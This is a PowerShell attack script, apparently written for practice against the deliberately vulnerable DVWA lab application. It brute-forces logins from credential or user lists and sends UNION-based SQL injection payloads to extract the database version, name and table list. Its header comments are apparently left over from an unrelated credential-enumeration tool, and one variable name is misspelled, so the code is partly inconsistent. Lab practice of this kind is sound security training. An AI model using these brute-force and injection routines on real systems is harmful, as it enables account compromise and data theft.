function Invoke-DVWATools {
    <#

    .SYNOPSIS

    This function will call the Invoke-EuaUserEnum function to login to EUA and pull out job codes and security question/answer information given a username and password. 

    Author: Jake Miller
    Warning: Code is provided as is and the author take no responsibility for anything bad that happens if you execute this code. Use at your own risk. 
    
    .DESCRIPTION

    This function will call the Invoke-EuaUserEnum function to login to EUA and pull out job codes and security question/answer information given a username and password..

    .PARAMETER CredentialFile

    This paramater indicates the file that contains usernames and passwords (delimitted by a ":") in a text file. For example, the text file should look like this:

    .Example

    C:\PS> Get-EUAInfo -CredentialFile .\users_passwords.txt 
    User Id:   MYID
    Full Name: Miller, Jake
    #>

    [cmdletbinding()]
    Param(

    [Parameter(Mandatory = $true)]
    $UrlPath,

    [Parameter(Mandatory = $true)]
    $DVWAUsername,

    [Parameter(Mandatory = $true)]
    $DVWAPassword,
    
    [Parameter(Mandatory = $false)]
    $BruteCredentialFile,

    [Parameter(Mandatory = $false)]
    $BruteSingleUserName,

    [Parameter(Mandatory = $false)]
    $BruteSinglePassword,

    [Parameter(Mandatory = $false)]
    $BruteUserList,

    [Parameter(Mandatory = $false)]
    $BrutePasswordList,

    [Parameter(Mandatory = $false)]
    [switch]
    $RandomAgent,

    [Parameter(Mandatory = $false)]
    [switch]
    $SQLInject,

    [Parameter(Mandatory = $false)]
    [switch]
    $BruteForce

    )

    $my_proxy = "http://127.0.0.1:8080"
    if($RandomAgent) {
        $user_agent = Use-RandomAgent
    }
    else{
        $user_agent = [Microsoft.PowerShell.Commands.PSUserAgent]::FireFox
    }
    Invoke-DVWALogin
} #END INVOKE-DVWATOOLS

function Use-RandomAgent {
    $num = Get-Random -Minimum 1 -Maximum 5
    if($num -eq 1) {
        $ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
    } 
    elseif($num -eq 2) {
        $ua = [Microsoft.PowerShell.Commands.PSUserAgent]::FireFox
    }
    elseif($num -eq 3) {
        $ua = [Microsoft.PowerShell.Commands.PSUserAgent]::InternetExplorer
    }
    elseif($num -eq 4) {
        $ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Opera
    }
    elseif($num -eq 5) {
        $ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Safari
    }
    return $ua
}

function Invoke-DVWALogin {

    $auth_url = $UrlPath + 'login.php'
    $auth_data = @{username=$DVWAUsername; password=$DVWAPassword; Login='Login'}    
    $auth_resp = Invoke-WebRequest -Uri $auth_url -SessionVariable session -UserAgent $user_agent -Method Post -Body $auth_data -Proxy $my_proxy
    if($auth_resp.BaseResponse.ResponseUri.OriginalString -eq 'http://192.168.217.132/dvwa/index.php') {
        Write-Host("Login Succesful with $DVWAUsername") -ForegroundColor Cyan
    }
    else {
        Write-Host("Login NOT Successful with $DVWAUsername. Please check the URL and/or credentials and try again. Quitting!") -ForegroundColor Red
        return
    }
    Write-Host("The DVWA security level is currently set to: ") -NoNewline -ForegroundColor Cyan
    Write-Host $auth_resp.BaseResponse.Cookies.Value -ForegroundColor Cyan
    if($BruteForce) {
        if($BruteCredentialFile) {
            if(Test-Path $BriuteCredentialFile){
                $creds = Get-Content $BruteCredentialFile
            }
            else {
                Write-Host("The file was not found. Please check the filepath.") -ForegroundColor Red
            }
            foreach($cred in $creds) {
                $user = $cred.Split(':')[0]
                $password = $cred.Split(':')[1]
                Invoke-DVWABruteForce
            }
        }
        elseif($BruteSingleUserName -and $BruteSinglePassword) {
            $user = $BruteSingleUserName
            $password = $BruteSinglePassword
            Invoke-DVWABruteForce
        }
        elseif($BruteUserList -and $BruteSinglePassword) {
            $password = $BruteSinglePassword
            if(Test-Path $BruteUserList) {
                $user_list = Get-Content($BruteUserList)
            }
            else {
                Write-Host("The file was not found. Please check the file path.") -ForegroundColor Red
                Return
            }
            foreach($user in $user_list) {
                Invoke-DVWABruteForce
            }
        }
    }

    if($SQLInject) {
        Invoke-DVWASQLI
    }

} #END INVOKE-DVWALOGIN

function Invoke-DVWABruteForce {
    $brute_url = $UrlPath + "vulnerabilities/brute/?username=" + $user + "&password=" + $password + "&Login=Login"
    $brute_resp = Invoke-WebRequest -Uri $brute_url -WebSession $session -UserAgent $user_agent -Proxy $my_proxy
    $parsed_resp = $brute_resp.AllElements | Where-Object Class -eq 'vulnerable_code_area' | Select-Object -ExpandProperty outerText
    if($parsed_resp.contains('Welcome') -eq 'True') {
        [console]::Beep(500, 300)
        Write-Host("Credentials successfully guessed - $user : $password") -ForegroundColor Green
    }
} #END INVOKE-DVWABRUTEFORCE

function Invoke-DVWASQLI {
    $sqli_base_url = $UrlPath + "vulnerabilities/sqli/"
    $sqli_base_resp = Invoke-WebRequest -Uri $sqli_base_url -WebSession $session -UserAgent $user_agent -Proxy $my_proxy
    $version_query = "' UNION SELECT NULL,VERSION() -- "
    $sqli_url = $UrlPath + "vulnerabilities/sqli/?id=" + $version_query + "&Submit=Submit"
    $sqli_resp = Invoke-WebRequest -Uri $sqli_url -WebSession $session -UserAgent $user_agent -Proxy $my_proxy
    $db_version = $sqli_resp.AllElements | Where-Object Class -eq 'vulnerable_code_area' | Select-Object -ExpandProperty outerText
    Write-Host("DB Version: MySQL ") -NoNewline
    Write-Host($db_version.substring(72))
    
    $db_query = "' UNION SELECT NULL,DATABASE() -- "
    $sqli_url = $UrlPath + "vulnerabilities/sqli/?id=" + $db_query + "&Submit=Submit"
    $sqli_resp = Invoke-WebRequest -Uri $sqli_url -WebSession $session -UserAgent $user_agent -Proxy $my_proxy
    $db_name = $sqli_resp.AllElements | Where-Object Class -eq 'vulnerable_code_area' | Select-Object -ExpandProperty outerText
    Write-Host("DB Name:") -NoNewline
    Write-Host($db_name.substring(72))

    $tables_query = "' UNION SELECT table_schema,table_name FROM information_schema.tables -- "
    $sqli_url = $UrlPath + "vulnerabilities/sqli/?id=" + $tables_query + "&Submit=Submit"
    $sqli_resp = Invoke-WebRequest -Uri $sqli_url -WebSession $session -UserAgent $user_agent -Proxy $my_proxy
    $unparsed_table_names = @($sqli_resp.AllElements | Where-Object {$_.Tagname -eq 'pre'} | Select-Object innerText | Format-List | Out-String)
    #TODO Parse the tables...pull the columns...extract data    
} #END INVOKE-DVWASQLI

